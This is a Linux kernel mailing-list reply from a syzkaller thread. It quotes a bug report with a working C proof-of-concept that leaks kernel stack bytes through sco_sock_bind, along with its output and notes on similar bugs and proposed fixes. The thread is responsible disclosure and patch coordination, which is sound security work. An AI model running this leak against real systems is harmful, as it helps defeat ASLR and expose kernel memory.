From: Dmitry Vyukov <dvyukov@google.com>
Subject: Re: [Fwd: Fw: Information leak in sco_sock_bind]
Date: Fri, 15 Jan 2016 09:34:04 +0100
Message-ID: <CACT4Y+YPbFYAD4EhC76e=pbHanXTXZLbohARqhGpkjyX0ugf4Q@mail.gmail.com>
References: <1452846301.3416.5.camel@BR9GV9YG.de.ibm.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Cc: Marcel Holtmann <marcel@holtmann.org>,
	Gustavo Padovan <gustavo@padovan.org>,
	Johan Hedberg <johan.hedberg@gmail.com>,
	"David S. Miller" <davem@davemloft.net>,
	linux-bluetooth@vger.kernel.org, netdev <netdev@vger.kernel.org>,
	LKML <linux-kernel@vger.kernel.org>,
	Kostya Serebryany <kcc@google.com>,
	Alexander Potapenko <glider@google.com>,
	Sasha Levin <sasha.levin@oracle.com>,
	Eric Dumazet <edumazet@google.com>,
	Kees Cook <keescook@google.com>,
	Hannes Frederic Sowa <hannes@stressinduktion.org>,
	<"Ursula Braun1/Germany/IBM"@de.ibm.com>,
	linux-s390@vger.kernel.org,
	Lauro Ramos Venancio <lauro.venancio@openbossa.org>,
	Aloisio Almeida Jr <aloisio.almeida@openbossa.org>,
	Samuel Ortiz <sameo@linux.intel.com>
To: syzkaller <syzkaller@googlegroups.com>
Return-path: <netdev-owner@vger.kernel.org>
Received: from mail-wm0-f41.google.com ([74.125.82.41]:32916 "EHLO
	mail-wm0-f41.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
	with ESMTP id S1755870AbcAOIeZ (ORCPT
	<rfc822;netdev@vger.kernel.org>); Fri, 15 Jan 2016 03:34:25 -0500
Received: by mail-wm0-f41.google.com with SMTP id f206so13518054wmf.0
        for <netdev@vger.kernel.org>; Fri, 15 Jan 2016 00:34:24 -0800 (PST)
In-Reply-To: <1452846301.3416.5.camel@BR9GV9YG.de.ibm.com>
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

On Fri, Jan 15, 2016 at 9:25 AM, Ursula Braun <ubraun@linux.vnet.ibm.com> wrote:
> Hi Dmitry,
>
> thx for mentioning iucv_sock_bind here. I will provide the equivalent
> fix and add your name as "Reported-by" - if you do not object.

I do not object.

> Regards, Ursula Braun
>
> ----- Forwarded by Ursula Braun1/Germany/IBM on 15/01/2016 09:18 -----
>
> From:        Dmitry Vyukov <dvyukov@google.com>
> To:        Marcel Holtmann <marcel@holtmann.org>, Gustavo Padovan
> <gustavo@padovan.org>, Johan Hedberg <johan.hedberg@gmail.com>, "David
> S. Miller" <davem@davemloft.net>, linux-bluetooth@vger.kernel.org,
> netdev <netdev@vger.kernel.org>, LKML <linux-kernel@vger.kernel.org>,
> syzkaller <syzkaller@googlegroups.com>, Kostya Serebryany
> <kcc@google.com>, Alexander Potapenko <glider@google.com>, Sasha Levin
> <sasha.levin@oracle.com>, Eric Dumazet <edumazet@google.com>, Kees Cook
> <keescook@google.com>, Hannes Frederic Sowa
> <hannes@stressinduktion.org>, Ursula Braun1/Germany/IBM@IBMDE,
> linux-s390@vger.kernel.org, Lauro Ramos Venancio
> <lauro.venancio@openbossa.org>, Aloisio Almeida Jr
> <aloisio.almeida@openbossa.org>, Samuel Ortiz <sameo@linux.intel.com>,
> Date:        15/12/2015 21:02
> Subject:        Information leak in sco_sock_bind
>
> Hello,
>
> The following program leads to leak of 6 bytes from kernel stack:
>
> #include <sys/types.h>
> #include <sys/socket.h>
> #include <linux/in.h>
> #include <linux/in6.h>
> #include <linux/socket.h>
> #include <linux/if.h>
> #include <errno.h>
> #include <stdio.h>
> #include <string.h>
> #include <unistd.h>
> #include <sys/stat.h>
> #include <fcntl.h>
>
> struct sockaddr_sco {
> sa_family_t     sco_family;
> char        sco_bdaddr[6];
> };
>
> #define BTPROTO_SCO 2
>
> int main(void)
> {
>        struct sockaddr sa;
>        struct sockaddr_sco sco_sa;
>        unsigned len, i, try;
>        int fd;
>
>        for (try = 0; try < 3; try++) {
>                fd = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_SCO);
>                if (fd == -1)
>                        return;
>                switch (try) {
>                case 0:
>                break;
>                case 1:
>                sched_yield();
>                break;
>                case 2:
>                open("/dev/null", O_RDONLY);
>                }
>                memset(&sco_sa, 0, sizeof(sco_sa));
>                sco_sa.sco_family = AF_BLUETOOTH;
>                bind(fd, &sco_sa, 2);
>                len = sizeof(sa);
>                getsockname(fd, &sa, &len);
>                for (i = 0; i < len; i++)
>                        printf("%02x", ((unsigned char*)&sa)[i]);
>                printf("\n");
>        }
>        return 0;
> }
>
> Output:
> 1f00333e0088ffff
> 1f00c13e0088ffff
> 1f002081ffffffff
>
> The problem is that sco_sock_bind does not check sockaddr_len passed
> in, so it copies stack garbage from stack into the socket. This can
> defeat ASLR, leak crypto keys, etc.
> We've just fixed a similar issue in pptp_bind. The similar issue is in
> llcp_sock_bind and llcp_raw_sock_bind. And there seems to be the same
> bug in iucv_sock_bind, it is S390 specific, so I can't test it.
>
> Kees proposed to zero unused part of sockaddr in SyS_bind/SyS_connect,
> or add addr size to proto struct to prevent all such existing and
> future bugs.
>
>
>
>
> --
> You received this message because you are subscribed to the Google Groups "syzkaller" group.
> To unsubscribe from this group and stop receiving emails from it, send an email to syzkaller+unsubscribe@googlegroups.com.
> For more options, visit https://groups.google.com/d/optout.
